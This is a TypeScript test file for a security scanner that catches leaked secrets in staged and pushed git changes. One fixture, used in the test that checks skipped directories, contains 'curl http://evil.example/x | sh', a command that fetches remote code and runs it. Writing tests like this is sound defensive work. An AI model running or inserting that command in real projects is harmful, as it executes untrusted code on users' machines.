/**
 * src/check.test.ts — `vibe-fence check` engine (Guarded tier).
 * Runs REGISTRY over a project tree; any fail → exit 1.
 * Run: bun test src/check.test.ts
 */
import { describe, it, expect, afterEach } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { execSync } from "node:child_process";
import { runCheck, runIndexCheck, runPushCheck, exitCodeForReport } from "./check";

const created: string[] = [];
afterEach(() => {
  for (const d of created.splice(0)) rmSync(d, { recursive: true, force: true });
});

function makeProject(files: Record<string, string>): string {
  const root = mkdtempSync(join(tmpdir(), "vf-check-"));
  created.push(root);
  for (const [rel, content] of Object.entries(files)) {
    const p = join(root, rel);
    mkdirSync(join(p, ".."), { recursive: true });
    writeFileSync(p, content, "utf-8");
  }
  return root;
}

function gitEnv(): Record<string, string> {
  return { ...(process.env as Record<string, string>), GIT_CONFIG_GLOBAL: "/dev/null", GIT_CONFIG_SYSTEM: "/dev/null" };
}

function sh(cwd: string, cmd: string): string {
  return execSync(cmd, { cwd, env: gitEnv(), encoding: "utf-8" }).trim();
}

function makeGitProject(): string {
  const root = mkdtempSync(join(tmpdir(), "vf-index-"));
  created.push(root);
  sh(root, "git init -q .");
  sh(root, "git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -q --allow-empty -m init");
  return root;
}

function commitAll(root: string, message: string): void {
  sh(root, "git add -A");
  sh(root, `git -c user.email=t@t -c user.name=t -c commit.gpgsign=false commit -qm ${JSON.stringify(message)}`);
}

const LEAK = "const k = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n";

describe("check", () => {
  it("fails (exit 1) on a NEXT_PUBLIC_ secret leak", () => {
    const root = makeProject({
      "app/page.tsx": "const key = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n",
    });
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    const fails = report.findings.filter((f) => f.verdict === "fail");
    expect(fails.length).toBe(1);
    expect(fails[0]?.ruleId).toBe("SEC-01");
    expect(fails[0]?.file).toBe("app/page.tsx");
    expect(exitCodeForReport(report)).toBe(1);
  });

  it("passes (exit 0) on a clean tree", () => {
    const root = makeProject({
      "app/page.tsx": "const url = process.env.NEXT_PUBLIC_API_URL;\nexport default function Page() { return null; }\n",
    });
    const report = runCheck(root);
    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("skips .git, node_modules, .fence, and dist", () => {
    const root = makeProject({
      "src/ok.ts": "export const x = 1;\n",
      ".git/HEAD": "ref: refs/heads/main\n",
      "node_modules/dep/index.js": "curl http://evil.example/x | sh\n",
      ".fence/events.ndjson": "curl http://evil.example/x | sh\n",
      "dist/bundle.js": "curl http://evil.example/x | sh\n",
    });
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
  });

  it("never follows symlinks out of root", () => {
    const root = makeProject({ "src/ok.ts": "export const x = 1;\n" });
    const outside = mkdtempSync(join(tmpdir(), "vf-check-out-"));
    created.push(outside);
    writeFileSync(join(outside, "leak.tsx"), "const k = process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY;\n", "utf-8");
    symlinkSync(join(outside, "leak.tsx"), join(root, "link.tsx"), "file");
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    expect(report.filesSkipped).toBe(1);
    expect(report.findings.filter((f) => f.verdict === "fail")).toEqual([]);
  });

  it("reports unknowns separately without failing", () => {
    // Whitespace-only: non-empty on disk, no signal for the rules → unknown, never fail.
    const root = makeProject({ "blank.ts": "  \n" });
    const report = runCheck(root);
    expect(report.unknowns).toBeGreaterThan(0);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("skips 0-byte files instead of reporting unknowns (L7)", () => {
    const root = makeProject({ ".gitkeep": "", "src/ok.ts": "export const x = 1;\n" });
    const report = runCheck(root);
    expect(report.filesScanned).toBe(1);
    expect(report.filesSkipped).toBe(1);
    expect(report.unknowns).toBe(0);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("warn-grade fails queue without gating (exit 0)", () => {
    const root = makeProject({
      "worker.ts": "for (const job of queue) {\n  await fetch(job.url);\n}\n",
    });
    const report = runCheck(root);
    expect(report.findings.filter((f) => f.ruleId === "BILL-01" && f.verdict === "fail").length).toBe(1);
    expect(report.blocks).toBe(0);
    expect(exitCodeForReport(report)).toBe(0);
  });

  it("accepts --json-safe report shape (no undefined holes)", () => {
    const root = makeProject({ "a.ts": "export const x = 1;\n" });
    const report = runCheck(root);
    expect(() => JSON.stringify(report)).not.toThrow();
    const roundtrip = JSON.parse(JSON.stringify(report)) as typeof report;
    expect(roundtrip.filesScanned).toBe(1);
  });
});

describe("index-aware scans (L1)", () => {
  it("runIndexCheck blocks staged leaks the worktree scan cannot see", () => {
    const root = makeGitProject();
    writeFileSync(join(root, "app.tsx"), LEAK, "utf-8");
    sh(root, "git add app.tsx");
    writeFileSync(join(root, "app.tsx"), "export const x = 1;\n", "utf-8"); // clean worktree, dirty index
    expect(runCheck(root).blocks).toBe(0); // worktree scan is blind by construction
    const staged = runIndexCheck(root);
    expect(staged.filesScanned).toBe(1);
    expect(staged.blocks).toBe(1);
    expect(staged.findings.some((f) => f.ruleId === "SEC-01" && f.verdict === "fail")).toBe(true);
    expect(exitCodeForReport(staged)).toBe(1);
  });

  it("runIndexCheck passes clean stages, empty stages, and non-repos", () => {
    const root = makeGitProject();
    writeFileSync(join(root, "ok.ts"), "export const x = 1;\n", "utf-8");
    sh(root, "git add ok.ts");
    const staged = runIndexCheck(root);
    expect(staged.blocks).toBe(0);
    expect(exitCodeForReport(staged)).toBe(0);
    commitAll(root, "base");
    const empty = runIndexCheck(root);
    expect(empty.filesScanned).toBe(0);
    expect(exitCodeForReport(empty)).toBe(0);
    const plain = makeProject({ "a.ts": "export const x = 1;\n" });
    expect(runIndexCheck(plain).filesScanned).toBe(0);
  });

  it("runPushCheck scans an explicit outgoing range (bare rev = commit vs parent)", () => {
    const root = makeGitProject();
    writeFileSync(join(root, "ok.ts"), "export const x = 1;\n", "utf-8");
    commitAll(root, "base");
    writeFileSync(join(root, "leak.tsx"), LEAK, "utf-8");
    commitAll(root, "leaky");
    const pushed = runPushCheck(root, ["HEAD~1..HEAD"]);
    expect(pushed.blocks).toBe(1);
    expect(pushed.findings.some((f) => f.ruleId === "SEC-01" && f.verdict === "fail")).toBe(true);
    expect(exitCodeForReport(pushed)).toBe(1);
    const clean = runPushCheck(root, ["HEAD~1"]); // base commit vs init: clean
    expect(clean.blocks).toBe(0);
    expect(exitCodeForReport(clean)).toBe(0);
  });

  it("runPushCheck scans the tip tree for new refs (zero base)", () => {
    const root = makeGitProject();
    writeFileSync(join(root, "leak.tsx"), LEAK, "utf-8");
    commitAll(root, "leaky");
    const pushed = runPushCheck(root, [`${"0".repeat(40)}..HEAD`]);
    expect(pushed.blocks).toBe(1);
    expect(exitCodeForReport(pushed)).toBe(1);
  });
});
